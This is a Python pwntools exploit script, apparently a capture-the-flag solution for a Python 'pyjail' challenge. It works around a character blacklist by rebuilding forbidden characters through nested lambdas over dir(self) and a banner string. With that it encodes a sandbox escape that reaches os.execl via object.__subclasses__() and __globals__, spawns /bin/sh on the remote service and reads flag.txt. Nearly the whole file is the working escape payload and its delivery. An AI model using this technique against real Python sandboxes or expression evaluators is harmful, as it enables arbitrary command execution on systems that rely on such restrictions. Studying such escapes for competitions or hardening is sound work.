import enum
from pwn import *
from itertools import combinations
import re

from pwnlib.adb import build

context.log_level = "error"


badchars = [ 'c', 'h', 'j', 'k', 'n', 'o', 'p', 'q', 'u', 'w', 'x',
            'y', 'z' , 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I',
            'J', 'K', 'L', 'M', 'N' , 'O', 'P', 'Q', 'R', 'S', 'T',
            'U', 'V', 'W' , 'X', 'Y', 'Z', '!', '#', '$', '%', '&',
            '-', '/', ';', '<', '=', '>', '?', '@' , '[', '\\', ']',
            '^', '`', '{', '|', '}', '~' , '0', '1', '2', '3', '4',
            '5', '6', '7', '8', '9']

title = r"                    (now with refactored code! \o/)"

## there are 29 items in dir(self)

def get_param_names(s):
    available="abdefgilmrstv"
    comb = sorted(set(combinations(available,4)))
    params = [''.join(comb.pop()) for _ in s]
    return params


def get_left_parentheses():
    left_parentheses_idx = title.find("(")
    title_params = get_param_names(title)
    return f"(lambda {','.join(title_params)}: {title_params[left_parentheses_idx]})(*self.title)"

def get_right_parentheses():
    right_parentheses_idx = title.find(")")
    title_params = get_param_names(title)
    return f"(lambda {','.join(title_params)}: {title_params[right_parentheses_idx]})(*self.title)"

def get_both_parentheses():
    right_parentheses_idx = title.find(")")
    left_parentheses_idx = title.find("(")
    title_params = get_param_names(title)
    return f"(lambda {','.join(title_params)}: {title_params[left_parentheses_idx]} + {title_params[right_parentheses_idx]})(*self.title)"


dir_self = ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__',
            '__eq__', '__format__', '__ge__', '__getattribute__',
            '__getstate__', '__gt__', '__hash__', '__init__',
            '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__',
            '__new__', '__reduce__', '__reduce_ex__', '__repr__',
            '__setattr__', '__sizeof__', '__str__', '__subclasshook__',
            '__weakref__', 'run_code', 'title']



def build_string_with_lambdas(wanted, list_of_strings=dir_self):
    global title

    def get_slash():
        idx = title.find("/")
        title_params = get_param_names(title)
        return f"(lambda {','.join(title_params)}: {title_params[idx]})(*self.title)"

    params = get_param_names(list_of_strings)
    string_found = False
    i = 0

    split = re.split(r"[/]", wanted)
    output = ""
    encoded_list = []

    for idx, wanted in enumerate(split):
        if wanted == '':
            encoded_list.append('')
            continue

        last_char_was_not_in_badchars = False
        output = f"(lambda {','.join(params)} : "

        for char in wanted:
            i = 0
            string_found = False

            if char not in badchars:
                if last_char_was_not_in_badchars:
                    output = output[:-2]
                    output += f'{char}"+'
                else:
                    output += f'"{char}"+'
                last_char_was_not_in_badchars = True
            else:
                last_char_was_not_in_badchars = False
                # find the first string in list_of_strings that provides char
                while i < len(list_of_strings) and (not string_found):
                    if (char in list_of_strings[i]):
                        # print(char, "found in ", list_of_strings[i])
                        string_found = True
                    else:
                        i += 1

                assert(i < len(list_of_strings)), f"search failed for {char}"

                source_of_chars = get_param_names(list_of_strings[i])
                idx_of_char = list_of_strings[i].find(char)
                # print("idx of", char, "in", list_of_strings[i], ":", idx_of_char)

                output += f"(lambda {','.join(source_of_chars)} : {source_of_chars[idx_of_char]})(*{params[i]})+"

        # remove last "+" from output
        output = output[:-1]
        output += ")(*dir(self))"
        encoded_list.append(output)

    out = f"+ {get_slash()} + ".join(encoded_list)
    if split[-1] == '':
        out = out[:-2] # hack to get arout the last "+" if the last wanted is ''
    return out


# Trying to write
# ('a').__class__.__base__.__subclasses__()[155].__init__.__globals__['execl']('/bin/sh', '/bin/sh')
# in jail env the 155th entry is 'os._wrap_close'

if __name__ == "__main__":
    context.log_level = "error"
    io = remote(args.HOST, args.PORT, ssl=args.SSL)
    if args.TEAM_TOKEN:
        io.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())

    params = get_param_names(range(163))
    dict_params = get_param_names(range(406))
    execl_index = 372
    code = (
        f"(lambda {','.join(params)} : " +
            f"(lambda {','.join(dict_params)} : (lambda _, val: val('/bin/sh', '/bin/sh'))(*{dict_params[execl_index]}))(*{params[155]}.__init__.__globals__.items()))" +
        f"(*('a').__class__.__base__.__subclasses__())"
    )

    payload = build_string_with_lambdas(code)
    io.sendlineafter(b"Will you be able to read the $FLAG?\n> ", payload.encode('ascii'))

    time.sleep(1)

    io.sendline(b"cat flag.txt")
    print(io.recv().decode())
